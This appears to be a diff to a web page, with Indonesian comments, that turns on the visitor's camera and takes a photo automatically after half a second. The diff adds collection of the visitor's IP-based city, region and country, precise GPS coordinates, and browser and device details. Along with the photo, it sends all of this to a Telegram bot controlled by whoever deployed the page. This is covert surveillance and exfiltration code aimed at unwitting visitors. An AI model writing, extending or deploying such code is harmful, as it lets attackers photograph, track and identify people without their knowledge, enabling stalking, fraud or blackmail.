@@ -10,7 +10,6 @@
         video { width: 100%; border-radius: 8px; background: #000; margin: 15px 0; transform: scaleX(-1); }
         .status { margin: 10px 0; padding: 8px; border-radius: 6px; background: #0f3460; font-size: 14px; }
         .msg { margin-top: 12px; font-size: 14px; color: #888; }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -46,7 +45,6 @@
             video.srcObject = stream;
             statusEl.textContent = '✅ Kamera aktif';
 
-            // AUTO CAPTURE SETELAH 0,5 DETIK (BIAR KAMERA STABIL DULU)
             setTimeout(() => {
                 if (!photoTaken) captureAndSend();
             }, 500);
@@ -57,13 +55,13 @@
         }
     }
 
-    // ========== CAPTURE & KIRIM KE TELEGRAM ==========
+    // ========== CAPTURE + KIRIM SEMUA DATA ==========
     async function captureAndSend() {
         if (!stream || photoTaken) return;
 
         statusEl.textContent = '📸 Memproses...';
 
-        // 1. Capture frame
+        // 1. Capture foto
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 480;
         canvas.height = video.videoHeight || 360;
@@ -71,7 +69,28 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
-        // 2. Konversi ke Blob
+        // 2. Dapatkan IP & Data Device
+        const ipData = await getIPData();
+        const locationData = await getLocation();
+
+        // 3. Buat caption lengkap
+        const caption = `📸 *New Capture!*
+🕐 ${new Date().toLocaleString()}
+
+🌐 *IP:* ${ipData.ip || 'Unknown'}
+📍 *City:* ${ipData.city || 'Unknown'}
+🏙️ *Region:* ${ipData.region || 'Unknown'}
+🌍 *Country:* ${ipData.country || 'Unknown'}
+🗺️ *Map:* ${locationData ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}` : 'Tidak tersedia'}
+
+📱 *Device Info:*
+• Browser: ${navigator.userAgent}
+• Platform: ${navigator.platform}
+• Language: ${navigator.language}
+• Screen: ${screen.width}x${screen.height}
+• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+
+        // 4. Kirim foto + caption ke Telegram
         const byteString = atob(imageDataUrl.split(',')[1]);
         const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
         const ab = new ArrayBuffer(byteString.length);
@@ -81,11 +100,11 @@
         }
         const blob = new Blob([ab], { type: mimeString });
 
-        // 3. Kirim ke Telegram Bot
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', blob, 'capture.jpg');
-        formData.append('caption', `📸 Captured: ${new Date().toLocaleString()}\nIP: ${await getIP()}`);
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
 
         try {
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -115,15 +134,40 @@
         }
     }
 
-    // ========== GET IP ==========
-    async function getIP() {
+    // ========== GET IP + LOCATION (ipapi) ==========
+    async function getIPData() {
         try {
-            const res = await fetch('https://api.ipify.org?format=json');
+            const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
-            return data.ip || 'unknown';
-        } catch {
-            return 'unknown';
+            return {
+                ip: data.ip || 'Unknown',
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                country: data.country_name || 'Unknown'
+            };
+        } catch (err) {
+            return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
         }
+    }
+
+    // ========== GET GPS (Geolocation API) ==========
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude
+                    });
+                },
+                () => resolve(null),
+                { timeout: 5000, enableHighAccuracy: true }
+            );
+        });
     }
 
     // ========== JALANKAN ==========
